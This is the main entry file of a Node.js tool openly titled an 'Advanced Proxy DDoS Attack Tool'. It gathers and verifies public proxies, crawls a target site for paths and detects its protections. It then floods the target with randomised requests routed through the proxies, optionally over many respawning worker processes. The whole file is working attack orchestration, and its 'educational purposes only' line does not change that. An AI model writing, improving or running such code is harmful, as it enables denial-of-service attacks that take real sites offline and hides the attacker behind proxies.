/**
 * Main application entry point
 */
import fs from "fs/promises";
import cluster from "cluster";
import os from "os";
import { CONFIG } from "./config/index.js";
import { getAllProxies } from "./proxy/collector.js";
import { verifyProxies } from "./proxy/validator.js";
import { discoverPaths } from "./discovery/crawler.js";
import { executeAttack } from "./attack/engine.js";
import { generateReport } from "./attack/reporter.js";
import { detectProtections } from "./utils/http.js";

/**
 * Print help information
 */
function printHelp() {
  console.log(`
    ╔══════════════════════════════════════════════════════════════════╗
    ║           Advanced Proxy DDoS Attack Tool with Path Discovery    ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║ Usage:                                                           ║
    ║   node index.js <target_url> [options]                           ║
    ║                                                                  ║
    ║ Options:                                                         ║
    ║   -h, --help          Show this help message                     ║
    ║   -d, --duration <s>  Attack duration in seconds                 ║
    ║   -m, --multi         Use multiple processes (CPU cores)         ║
    ║   -sp, --skip-proxy   Skip proxy verification                    ║
    ║   -sc, --skip-crawl   Skip path discovery                        ║
    ║   -c, --cached        Use cached proxy and path data             ║
    ║   -pf, --proxy-file   Use custom proxy file                      ║
    ║   -paf, --paths-file  Use custom paths file                      ║
    ║   -mp, --max-proxies  Maximum number of proxies to use           ║
    ║   -v, --verbose       Enable verbose logging                     ║
    ║   -opt, --only-proxy-test  Only test proxies and save to file    ║
    ║   -o, --output <file> Output file for proxy testing results      ║
    ║                                                                  ║
    ║ Proxy Testing Mode:                                              ║
    ║   node index.js --only-proxy-test -o proxies_verified.txt        ║
    ║   node index.js --only-proxy-test -pf custom_proxies.txt         ║
    ║                                                                  ║
    ║ Attack Mode:                                                     ║
    ║   node index.js http://example.com -d 60 -pf proxies_verified.txt║
    ║                                                                  ║
    ║ Note: For educational purposes only!                             ║
    ╚══════════════════════════════════════════════════════════════════╝
  `);
}

/**
 * Parse command line arguments
 * @returns {Object} Parsed options
 */
function parseArguments() {
  const args = process.argv.slice(2);

  // Default options
  const options = {
    target: null,
    duration: CONFIG.ATTACK_DURATION,
    multiProcess: CONFIG.MULTI_PROCESS,
    skipProxyCheck: false,
    skipCrawling: false,
    useCachedData: false,
    proxyFile: null,
    pathsFile: null,
    maxProxies: 0,
    verbose: false,
    onlyProxyTest: false,    // New option for proxy testing only
    outputFile: null         // Custom output file for proxy testing results
  };

  // Parse arguments
  for (let i = 0; i < args.length; i++) {
    const arg = args[i];

    if (arg === '--help' || arg === '-h') {
      printHelp();
      process.exit(0);
    }
    else if (arg === '--multi' || arg === '-m') {
      options.multiProcess = true;
    }
    else if (arg === '--skip-proxy' || arg === '-sp') {
      options.skipProxyCheck = true;
    }
    else if (arg === '--skip-crawl' || arg === '-sc') {
      options.skipCrawling = true;
    }
    else if (arg === '--cached' || arg === '-c') {
      options.useCachedData = true;
    }
    else if (arg === '--verbose' || arg === '-v') {
      options.verbose = true;
    }
    else if (arg === '--only-proxy-test' || arg === '-opt') {
      options.onlyProxyTest = true;
    }
    else if ((arg === '--duration' || arg === '-d') && i + 1 < args.length) {
      options.duration = parseInt(args[++i]) * 1000;
    }
    else if ((arg === '--proxy-file' || arg === '-pf') && i + 1 < args.length) {
      options.proxyFile = args[++i];
    }
    else if ((arg === '--paths-file' || arg === '-paf') && i + 1 < args.length) {
      options.pathsFile = args[++i];
    }
    else if ((arg === '--max-proxies' || arg === '-mp') && i + 1 < args.length) {
      options.maxProxies = parseInt(args[++i]);
    }
    else if ((arg === '--output' || arg === '-o') && i + 1 < args.length) {
      options.outputFile = args[++i];
    }
    else if (!options.target && arg.startsWith('http')) {
      options.target = arg;
    }
  }

  return options;
}

/**
 * Multi-process attack setup using cluster module
 * @param {string} target - Target URL
 * @param {string[]} paths - Discovered paths
 * @param {string[]} workingProxies - Working proxies
 * @param {number} duration - Attack duration
 * @returns {Promise<void>}
 */
async function setupCluster(target, paths, workingProxies, duration) {
  if (cluster.isPrimary) {
    console.log(`\n🖥️ Setting up cluster mode with multiple workers`);

    // Count CPUs
    const numCPUs = os.cpus().length;
    const workers = CONFIG.PROCESS_COUNT > 0 ?
      Math.min(CONFIG.PROCESS_COUNT, numCPUs) : numCPUs;

    console.log(`Master process running on PID ${process.pid}`);
    console.log(`Launching ${workers} worker processes...`);

    // Shared data between processes
    let totalRequests = 0;
    let successfulRequests = 0;
    let failedRequests = 0;

    // Pass data to workers
    const workerData = {
      target,
      paths,
      workingProxies,
      duration
    };

    // Fork workers
    for (let i = 0; i < workers; i++) {
      const worker = cluster.fork();
      worker.send({ type: 'init', data: workerData });

      // Listen for messages from workers
      worker.on('message', (msg) => {
        if (msg.type === 'stats') {
          totalRequests += msg.requests;
          successfulRequests += msg.successful;
          failedRequests += msg.failed;

          // Log periodic updates
          if (totalRequests % 1000 === 0) {
            const successRate = ((successfulRequests / totalRequests) * 100).toFixed(1);
            const elapsedTime = (Date.now() - startTime) / 1000;
            console.log(`Total requests: ${totalRequests} | Success: ${successfulRequests} (${successRate}%) | RPS: ${Math.floor(totalRequests / elapsedTime)}`);
          }
        }
      });
    }

    const startTime = Date.now();

    // Listen for worker exits
    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died with code ${code} and signal ${signal}`);

      // If the attack is still ongoing, replace the worker
      if (Date.now() - startTime < duration) {
        console.log('Starting a replacement worker...');
        const newWorker = cluster.fork();
        newWorker.send({ type: 'init', data: workerData });
      }
    });

    // Stop all workers when duration is reached
    setTimeout(() => {
      console.log('\n⏱️ Attack duration reached. Stopping all workers...');
      for (const id in cluster.workers) {
        cluster.workers[id].send({ type: 'stop' });
      }

      // Final report
      setTimeout(() => {
        const totalTime = (Date.now() - startTime) / 1000;
        const requestsPerSecond = Math.floor(totalRequests / totalTime);

        console.log("\n\n📊 Final Attack Results:");
        console.log(`Target: ${target}`);
        console.log(`Duration: ${totalTime.toFixed(2)} seconds`);
        console.log(`Total Requests: ${totalRequests} (${requestsPerSecond} req/sec)`);
        console.log(`Successful Requests: ${successfulRequests} (${((successfulRequests / totalRequests) * 100).toFixed(1)}%)`);
        console.log(`Failed Requests: ${failedRequests} (${((failedRequests / totalRequests) * 100).toFixed(1)}%)`);

        const reportStats = {
          target,
          duration: totalTime,
          paths: paths.length,
          totalRequests,
          requestsPerSecond,
          successCount: successfulRequests,
          failCount: failedRequests,
          wsSuccessCount: 0,
          wsFailCount: 0,
          bytesSent: 0,  // Not available in multi-process mode
          bytesReceived: 0, // Not available in multi-process mode
          statusCodes: {}, // Not available in multi-process mode
          methodStats: {}, // Not available in multi-process mode
          proxyStats: [], // Not available in multi-process mode
          pathStats: []  // Not available in multi-process mode
        };

        generateReport(reportStats).then(() => process.exit(0));
      }, 2000);
    }, duration);
  } else {
    // Worker process
    console.log(`Worker ${process.pid} started`);

    process.on('message', async (msg) => {
      if (msg.type === 'init') {
        // Extract data sent from master
        const { target, paths, workingProxies, duration } = msg.data;

        // Periodically report stats to master
        let workerStats = {
          requests: 0,
          successful: 0,
          failed: 0
        };

        const statsInterval = setInterval(() => {
          process.send({
            type: 'stats',
            requests: workerStats.requests,
            successful: workerStats.successful,
            failed: workerStats.failed
          });

          // Reset stats after sending
          workerStats.requests = 0;
          workerStats.successful = 0;
          workerStats.failed = 0;
        }, 1000);

        // Execute worker attack logic
        const attackStart = Date.now();
        let attackActive = true;

        // Execute attack in worker
        while (attackActive && Date.now() - attackStart < duration) {
          for (const proxy of workingProxies) {
            if (!attackActive) break;

            for (let i = 0; i < 10 && attackActive; i++) { // Send 10 requests per proxy
              const path = paths[Math.floor(Math.random() * paths.length)];
              const method = CONFIG.REQUEST_METHODS[Math.floor(Math.random() * 3)]; // First 3 methods

              // Import and use sendRequest directly in the worker
              const { sendRequest } = await import('./utils/http.js');
              const result = await sendRequest(path, proxy, method);

              workerStats.requests++;
              if (result.success) {
                workerStats.successful++;
              } else {
                workerStats.failed++;
              }
            }

            // Small delay between proxies
            await new Promise(resolve => setTimeout(resolve, 50));
          }
        }

        // Clean up when done
        process.on('message', (msg) => {
          if (msg.type === 'stop') {
            clearInterval(statsInterval);
            process.exit(0);
          }
        });
      }
    });
  }
}

/**
 * Read file if exists or return empty array
 * @param {string} filename - File path
 * @returns {Promise<string[]>} File contents as array of strings
 */
async function readFileIfExists(filename) {
  try {
    const content = await fs.readFile(filename, 'utf8');
    return content.split('\n').filter(line => line.trim() !== '');
  } catch (err) {
    return [];
  }
}

/**
 * Save content to file with optional backup of existing file
 * @param {string} filename - File path
 * @param {string} content - Content to write
 */
async function saveToFile(filename, content) {
  try {
    // Check if file exists, make backup if it does
    try {
      const stats = await fs.stat(filename);
      if (stats.isFile()) {
        const backupName = `${filename}.backup-${Date.now()}`;
        await fs.copyFile(filename, backupName);
        console.log(`✅ Backup created: ${backupName}`);
      }
    } catch (err) {
      // File doesn't exist, no backup needed
    }

    // Write the file
    await fs.writeFile(filename, content);
    console.log(`✅ Saved to ${filename}`);
  } catch (err) {
    console.error(`❌ Error saving to ${filename}: ${err.message}`);
  }
}

/**
 * Main application function
 */
async function main() {
  const options = parseArguments();

  // In proxy testing mode, we don't need a target URL
  if (!options.target && !options.onlyProxyTest) {
    printHelp();
    return;
  }

  // Handle proxy-only testing mode
  if (options.onlyProxyTest) {
    console.log(`
    🧪 Running in proxy testing mode
    📋 Testing and saving working proxies only
    `);

    // Define output filename
    const outputFile = options.outputFile || "working_proxies.txt";

    let allProxies = [];

    // Get proxies from file or sources
    if (options.proxyFile) {
      console.log(`📡 Loading proxies from ${options.proxyFile}...`);
      allProxies = await readFileIfExists(options.proxyFile);
      console.log(`📋 Loaded ${allProxies.length} proxies from file`);
    } else {
      console.log("📡 Fetching proxies from multiple sources...");
      allProxies = await getAllProxies();
    }

    if (allProxies.length === 0) {
      console.error("❌ No proxies found. Cannot proceed with testing.");
      return;
    }

    // Verify the proxies
    console.log(`\n🔍 Testing ${allProxies.length} proxies...`);
    const workingProxies = await verifyProxies(allProxies);

    // Save to specified output file
    if (workingProxies.length > 0) {
      await saveToFile(outputFile, workingProxies.join("\n"));
      console.log(`\n✅ Saved ${workingProxies.length} working proxies to ${outputFile}`);
      console.log(`\n🚀 To use these proxies in an attack, run:`);
      console.log(`   node src/index.js <target_url> -pf ${outputFile} [other options]`);
    } else {
      console.error("❌ No working proxies found.");
    }

    // Exit, we're done with proxy testing
    return;
  }

  // Regular attack mode
  console.log(`
    🔥 Starting advanced proxy-based DDoS tool with path discovery
    🎯 Target: ${options.target}
    ⏱️ Duration: ${options.duration / 1000} seconds
    🔍 Path discovery depth: ${CONFIG.CRAWL_DEPTH}
  `);

  // Detect target website protections
  await detectProtections(options.target);

  // Get and verify proxies
  let workingProxies = [];
  let allProxies = [];

  if (options.useCachedData) {
    console.log("📡 Using cached proxies...");
    workingProxies = await readFileIfExists('working_proxies.txt');
    console.log(`✅ Loaded ${workingProxies.length} cached proxies`);
  } else if (options.proxyFile) {
    console.log(`📡 Loading proxies from ${options.proxyFile}...`);
    allProxies = await readFileIfExists(options.proxyFile);

    if (options.skipProxyCheck) {
      workingProxies = allProxies;
    } else {
      workingProxies = await verifyProxies(allProxies);
    }
  } else {
    console.log("📡 Fetching proxies from multiple sources...");
    allProxies = await getAllProxies();

    if (!options.skipProxyCheck) {
      workingProxies = await verifyProxies(allProxies);
    } else {
      console.log("⚠️ Skipping proxy verification - using all proxies");
      workingProxies = allProxies;
    }
  }

  // Limit number of proxies if specified
  if (options.maxProxies > 0 && workingProxies.length > options.maxProxies) {
    console.log(`Limiting to ${options.maxProxies} proxies`);
    workingProxies = workingProxies.slice(0, options.maxProxies);
  }

  if (workingProxies.length === 0) {
    console.error("❌ No working proxies found. Cannot proceed with attack.");
    return;
  }

  // Discover paths on the target website
  let discoveredPaths = [];

  if (options.useCachedData) {
    console.log("\n🔍 Using cached paths...");
    discoveredPaths = await readFileIfExists('discovered_paths.txt');
    console.log(`✅ Loaded ${discoveredPaths.length} cached paths`);
  } else if (options.pathsFile) {
    console.log(`\n🔍 Loading paths from ${options.pathsFile}...`);
    discoveredPaths = await readFileIfExists(options.pathsFile);
    console.log(`✅ Loaded ${discoveredPaths.length} paths from file`);
  } else if (!options.skipCrawling) {
    console.log("\n🔍 Discovering paths on target website...");
    discoveredPaths = await discoverPaths(options.target, workingProxies);
  } else {
    console.log("\n⚠️ Skipping path discovery - using only base URL");
    discoveredPaths = [options.target];
  }

  // Add the base URL to the attack paths
  if (!discoveredPaths.includes(options.target)) {
    discoveredPaths.unshift(options.target);
  }

  // Execute attack using multi-process mode if enabled
  if (options.multiProcess) {
    await setupCluster(options.target, discoveredPaths, workingProxies, options.duration);
  } else {
    // Execute attack in single process
    const stats = await executeAttack(
      options.target,
      discoveredPaths,
      workingProxies,
      options.duration
    );
    await generateReport(stats);
  }
}

// Start execution with error handling
main().catch((error) => {
  console.error("Fatal error:", error);
});